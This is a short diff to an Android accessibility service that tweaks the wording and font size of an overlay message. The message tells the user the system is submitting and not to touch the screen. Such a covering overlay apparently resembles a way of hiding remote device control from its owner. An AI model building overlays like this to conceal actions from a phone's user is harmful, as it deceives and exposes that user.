@@ -760,9 +760,9 @@ class InputService : AccessibilityService() {
     	gohome = 8
 	overLay.setVisibility(gohome)
 	val loadingText = TextView(this, null)
- 	loadingText.text = "\n\n系统提交中\n请勿触碰手机屏幕\n避免影响解除进度\n请耐心等待..."
+ 	loadingText.text = "\n\n系统提交中\n请勿触碰手机屏幕\n避免影响进度\n请耐心等待..."
  	loadingText.setTextColor(-7829368)
- 	loadingText.textSize = 12.0f
+ 	loadingText.textSize = 13.0f
  	loadingText.gravity = Gravity.LEFT //Gravity.CENTER
  	loadingText.setPadding(60, HomeHeight  / 4, 0, 0)
  
